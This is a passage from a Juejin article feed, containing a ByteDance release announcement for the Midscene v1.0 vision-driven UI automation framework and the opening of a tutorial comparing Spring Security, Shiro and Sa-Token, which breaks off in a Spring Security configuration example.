<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ4k_5_waWJbRRo5lZBZmog" target="_blank" title="https://mp.weixin.qq.com/s/Z4k_5_waWJbRRo5lZBZmog" ref="nofollow noopener noreferrer">和一群志同道合的人，持续精进 AI 的每一天</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Midscene v1.0 发布 - 视觉驱动，UI 自动化体验跃迁]]></title>    <link>https://juejin.cn/post/7589093895326777353</link>    <guid>https://juejin.cn/post/7589093895326777353</guid>    <pubDate>2025-12-29T11:15:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093895326777353" data-draft-id="7589082912588677163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Midscene v1.0 发布 - 视觉驱动，UI 自动化体验跃迁"/> <meta itemprop="keywords" content="前端,客户端,人工智能"/> <meta itemprop="datePublished" content="2025-12-29T11:15:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="字节跳动开源"/> <meta itemprop="url" content="https://juejin.cn/user/1227510999971086"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Midscene v1.0 发布 - 视觉驱动，UI 自动化体验跃迁
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1227510999971086/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    字节跳动开源
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:15:53.000Z" title="Mon Dec 29 2025 11:15:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>文章来源｜ByteDance Web Infra 团队</p>
</blockquote>
<p>Midscene 自 2024 年开源发布以来，已经在 Github 斩获 11k star 、Trending 榜第二名等成绩，并在互联网、金融、政企、汽车等大量应用场景下完成落地。</p>
<p>本月，我们正式宣布 Midscene v1.0 发布！本文将为你介绍：</p>
<ul>
<li>案例回顾：Midscene 在 PC、Android、iOS 等场景的任务能力；</li>
<li>社区案例：社区开发者基于 Midscene 与任意界面集成的特性，扩展了机械臂 + 视觉模型 + 语音模型等模块，完成车机测试；</li>
<li>1.0 版本的模型路线：拥抱纯视觉；</li>
<li>1.0 版本的特性优化：报告优化、MCP 架构、跨端增强、API 变更等。</li>
</ul>
<h2 data-id="heading-0">案例回顾</h2>
<h4 data-id="heading-1">社区案例：视觉模型 + 机械臂</h4>
<p>演示视频请在公众号查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F24rFtAfihEos6f1u83jeLg" target="_blank" title="https://mp.weixin.qq.com/s/24rFtAfihEos6f1u83jeLg" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/24rFtAfih…</a></p>
<p>有社区开发者成功基于 Midscene 与任意界面集成的特性，扩展了机械臂 + 视觉模型 + 语音模型等模块，运用于车机大屏测试场景中。</p>
<h4 data-id="heading-2">移动端案例：外卖下单</h4>
<p>打开美团，帮我下单一杯 manner 超大杯冰美式咖啡，要加浓少冰喔，到结算页面让我确认。</p>
<p>演示视频请在公众号查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F24rFtAfihEos6f1u83jeLg" target="_blank" title="https://mp.weixin.qq.com/s/24rFtAfihEos6f1u83jeLg" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/24rFtAfih…</a></p>
<p>在我们的 Midscene 官网上，还有更多实战案例：</p>
<ol>
<li>iOS 自动化 - Twitter 自动点赞 @midscene_ai 首条推文；</li>
<li>Android 自动化 - 懂车帝查看小米 SU7 参数；</li>
<li>Android 自动化 - Booking 预订圣诞酒店；</li>
<li>MCP 集成 - Midscene MCP 操作界面发布 prepatch 版本。</li>
</ol>
<h2 data-id="heading-3">1.0 版本的模型路线</h2>
<p>从 V1.0 开始，Midscene 全面转向视觉理解方案，提供更稳定可靠的 UI 自动化能力。</p>
<p>视觉模型有以下特点：</p>
<ul>
<li>
<p><strong>效果稳定</strong> ：业界领先的视觉模型（如 Doubao Seed 1.6、Qwen3-VL 等）表现足够稳定，已经可以满足大多数业务需求；</p>
</li>
<li>
<p><strong>UI 操作规划</strong> ：视觉模型通常具备较强的 UI 操作规划能力，能够完成不少复杂的任务流程；</p>
</li>
<li>
<p><strong>适用于任意系统</strong> ：自动化框架不再依赖 UI 渲染的技术栈，无论是 Android、iOS、桌面应用，还是浏览器中的 <code>&lt;canvas&gt;</code>，只要能获取截图，Midscene 即可完成交互操作；</p>
</li>
<li>
<p><strong>易于编写</strong> ：抛弃各类 selector 和 DOM 之后，开发者与模型的“磨合”会变得更简单，不熟悉渲染技术的新人也能很快上手；</p>
</li>
<li>
<p><strong>token 量显著下降</strong> ：在去除 DOM 提取之后，视觉方案的 token 使用量可以减少 80%，成本更低，且本地运行速度也变得更快</p>
</li>
<li>
<p><strong>有开源模型解决方案</strong> ：开源模型表现渐佳，开发者开始有机会进行私有化部署模型，如 Qwen3-VL 提供的 8B、30B 等版本在不少项目中都有着不错的效果。</p>
</li>
</ul>
<p>详情请阅读我们更新版的<strong>模型策略[1]。</strong></p>
<h2 data-id="heading-4">🚀 多模型组合，为复杂任务带来更好效果</h2>
<p>除了默认的交互场景，Midscene 还定义了 Planning（规划）和 Insight（洞察）两种意图，开发者可以按需为它们启用独立的模型。例如，用 GPT 模型做规划，同时使用默认的 Doubao 模型做元素定位。</p>
<p>多模型组合让开发者可以按需提升复杂需求的处理能力。</p>
<h2 data-id="heading-5">🚀 运行时架构优化</h2>
<p>针对 Midscene 的运行时表现，我们进行了以下优化：</p>
<ul>
<li>减少对设备信息接口的调用，在确保安全的情况下复用部分上下文信息，提升运行时性能，让大多数的时间消耗集中在模型端；</li>
<li>优化 Web 及移动端环境下的 Action Space 组合，向模型开放更合理、更清晰的工具集。</li>
</ul>
<h2 data-id="heading-6">🚀 回放报告优化</h2>
<p>回放报告是 Midscene 开发者非常依赖的一个特性，它能有效提升脚本的调试效率。</p>
<p>在 v1.0 中，我们更新了回放报告：</p>
<ul>
<li>参数视图：标记出交互参数的位置信息，合并截图信息，快速识别模型的规划结果；</li>
<li>样式调整：支持以深色模式展示报告，更美观；</li>
<li>Token 消耗的展示：支持按模型汇总 Token 消耗量，分析不同场景的成本情况。</li>
</ul>
<h2 data-id="heading-7">🚀 MCP 架构重构</h2>
<p>我们重新定义了 Midscene MCP 服务的定位。Midscene MCP 的职责是围绕着视觉驱动的 UI 操作展开，将 iOS / Android / Web 设备 Action Space 中的每个 Action 操作暴露为 MCP 工具，也就是提供各类“原子操作”。</p>
<p>通过这种形式，开发者可以更专注于构建自己的高阶 Agent，而无需关心底层 UI 操作的实现细节，并且时刻获得满意的成功率。</p>
<p>详情请阅读 <strong>MCP 文档[2]。</strong></p>
<h2 data-id="heading-8">🚀 移动端能力增强</h2>
<p><strong>iOS 改进</strong></p>
<ul>
<li>
<p>新增 WebDriverAgent 5.x-7.x 全版本兼容；</p>
</li>
<li>
<p>新增 WebDriver Clear API 支持，解决动态输入框问题；</p>
</li>
<li>
<p>提升设备兼容性。</p>
</li>
</ul>
<p><strong>Android 改进</strong></p>
<ul>
<li>
<p>新增截图轮询回退机制，提升远程设备稳定性；</p>
</li>
<li>
<p>新增屏幕方向自动适配（displayId 截图）；</p>
</li>
<li>
<p>新增 YAML 脚本 <code>runAdbShell</code> 支持。</p>
</li>
</ul>
<p><strong>跨平台</strong></p>
<ul>
<li>在 Agent 实例上暴露系统操作接口，包括 Home、Back、RecentApp 等。</li>
</ul>
<h2 data-id="heading-9">🚧 API 变更</h2>
<p>方法重命名（向后兼容）：</p>
<ul>
<li>
<p>改名 <code>aiAction()</code> → <code>aiAct()</code>（旧方法保留，有弃用警告）；</p>
</li>
<li>
<p>改名 <code>logScreenshot()</code> → <code>recordToReport()</code>（旧方法保留，有弃用警告）。</p>
</li>
</ul>
<p>环境变量重命名（向后兼容）：</p>
<ul>
<li>改名 <code>OPENAI_API_KEY</code> → <code>MODEL_API_KEY</code>（新变量优先，旧变量作为备选）；</li>
<li>改名 <code>OPENAI_BASE_URL</code> → <code>MODEL_BASE_URL</code>（新变量优先，旧变量作为备选）。</li>
</ul>
<h2 data-id="heading-10">⬆️ 升级到最新版</h2>
<p>升级项目中的依赖，例如：</p>
<ul>
<li>
<p><code>npm install @midscene/web@latest --save-dev</code>；</p>
</li>
<li>
<p><code>npm install @midscene/android@latest --save-dev</code>；</p>
</li>
<li>
<p><code>npm install @midscene/ios@latest --save-dev</code>。</p>
</li>
</ul>
<p>如果使用全局安装的命令行版本：<code>npm i -g @midscene/cli</code>。</p>
<p><strong>了解更多</strong></p>
<ul>
<li>
<p>Midscene.js <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2F" title="https://midscenejs.com/" target="_blank" ref="nofollow noopener noreferrer">midscenejs.com</a></p>
</li>
<li>
<p>Github <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fweb-infra-dev%2Fmidscene" title="https://github.com/web-infra-dev/midscene" target="_blank" ref="nofollow noopener noreferrer">github.com/web-infra-d…</a></p>
</li>
<li>
<p>1.0 版本 Changelog <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2Fzh%2Fchangelog.html" title="https://midscenejs.com/zh/changelog.html" target="_blank" ref="nofollow noopener noreferrer">midscenejs.com/zh/changelo…</a></p>
</li>
</ul>
<p><strong>参考资料</strong></p>
<p>[1] 模型策略: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2Fzh%2Fmodel-strategy" target="_blank" title="https://midscenejs.com/zh/model-strategy" ref="nofollow noopener noreferrer"><em>https://midscenejs.com/zh/model-strategy</em></a></p>
<p>[2] MCP 文档: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmidscenejs.com%2Fzh%2Fmcp" target="_blank" title="https://midscenejs.com/zh/mcp" ref="nofollow noopener noreferrer"><em>https://midscenejs.com/zh/mcp</em></a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringSecurity、shiro 和 sa-token，到底选哪个？]]></title>    <link>https://juejin.cn/post/7589052659436077102</link>    <guid>https://juejin.cn/post/7589052659436077102</guid>    <pubDate>2025-12-29T11:40:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589052659436077102" data-draft-id="7589107312112795657" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringSecurity、shiro 和 sa-token，到底选哪个？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-29T11:40:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏三说技术"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringSecurity、shiro 和 sa-token，到底选哪个？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏三说技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T11:40:00.000Z" title="Mon Dec 29 2025 11:40:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>今天我们来聊聊一个让很多Java开发者纠结的技术选型问题：<strong>Spring Security、Apache Shiro和Sa-Token，这3个主流安全框架到底该选哪个？</strong></p>
<p>有些小伙伴在工作中可能遇到过这样的场景：新项目启动会上，架构师坚持要用Spring Security，团队里的老将却说Shiro更简单实用，而年轻的同事则力荐Sa-Token这个后起之秀。</p>
<p>大家各执一词，都有道理，到底该听谁的？</p>
<p>今天这篇文章就跟大家一起聊聊这个话题，希望对你会有所帮助。</p>
<p><a href="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" title="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank">更多项目实战在我的技术网站：www.susan.net.cn/project</a></p>
<h2 data-id="heading-1">1 我们为什么需要安全框架？</h2>
<p>在深入对比之前，我们先要理解：<strong>为什么不能自己手写安全逻辑，而非要用框架？</strong></p>
<p>想象一下，如果你要为一个电商系统实现权限控制，你需要处理：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 手写权限控制的典型痛点</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ManualSecurityExample</span> {
    
    <span class="hljs-comment">// 1. 每个方法都要写重复的权限校验</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Long productId, ProductDTO dto)</span> {
        <span class="hljs-comment">// 检查用户是否登录</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> getCurrentUser();
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"请先登录"</span>);
        }
        
        <span class="hljs-comment">// 检查用户是否有编辑权限</span>
        <span class="hljs-keyword">if</span> (!user.hasPermission(<span class="hljs-string">"product:update"</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForbiddenException</span>(<span class="hljs-string">"没有操作权限"</span>);
        }
        
        <span class="hljs-comment">// 检查是否是自己的商品（数据级权限）</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productService.getById(productId);
        <span class="hljs-keyword">if</span> (!product.getOwnerId().equals(user.getId())) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForbiddenException</span>(<span class="hljs-string">"只能修改自己的商品"</span>);
        }
        
        <span class="hljs-comment">// 实际业务逻辑...</span>
        productService.update(productId, dto);
    }
    
    <span class="hljs-comment">// 2. 每个Controller都要写登录检查</span>
    <span class="hljs-comment">// 3. 需要自己管理Session/Token</span>
    <span class="hljs-comment">// 4. 密码加密、CSRF防护都要自己实现</span>
    <span class="hljs-comment">// 5. 审计日志、安全事件处理...</span>
}
</code></pre>
<p>看到问题了吗？</p>
<p><strong>安全逻辑会像“幽灵代码”一样渗透到业务的每个角落</strong>，导致：</p>
<ul>
<li>代码重复率高</li>
<li>业务逻辑和安全逻辑耦合</li>
<li>难以统一维护和升级</li>
<li>容易遗漏安全防护点</li>
</ul>
<p><strong>安全框架的价值，就是把这些问题抽象化、标准化、自动化</strong>。</p>
<p>下面这个示意图展示了安全框架如何将安全关注点从业务代码中解耦出来：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0366f78d9f5e4a27a5e1e245e7ee8828~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=JaKTSsFw7MeIDMpHlJXYEmKV8vI%3D" alt="" loading="lazy"/></p>
<p>理解了安全框架的价值，接下来我们深入分析这三个主流选项。</p>
<h2 data-id="heading-2">2 Spring Security：企业级的安全“瑞士军刀”</h2>
<h3 data-id="heading-3">2.1 Spring Security是什么？</h3>
<p>Spring Security是Spring官方提供的安全框架，可以说是Spring生态中的“御林军”。</p>
<p>它不仅仅是一个权限控制框架，更是一个<strong>全面的安全解决方案</strong>。</p>
<h3 data-id="heading-4">2.2 核心架构：过滤器链的极致运用</h3>
<p>Spring Security的核心是<strong>过滤器链（Filter Chain）</strong>。</p>
<p>当一个请求到达时，它会经过一系列安全过滤器，每个过滤器负责特定的安全功能：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58db504b58584a86acd2d280558295e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=1oC89Wpf2wMHU%2BLx41FEoKV1l%2BU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.3 快速搭建一个安全的REST API</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 基础配置类</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringSecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
        http
            <span class="hljs-comment">// 禁用CSRF（REST API通常不需要）</span>
            .csrf().disable()
            
            <span class="hljs-comment">// 授权配置</span>
            .authorizeRequests()
                .antMatchers(<span class="hljs-string">"/api/public/**"</span>).permitAll()  <span class="hljs-comment">// 公开接口</span>
                .antMatchers(<span class="hljs-string">"/api/admin/**"</span>).hasRole(<span class="hljs-string">"ADMIN"</span>)  <span class="hljs-comment">// 需要管理员角色</span>
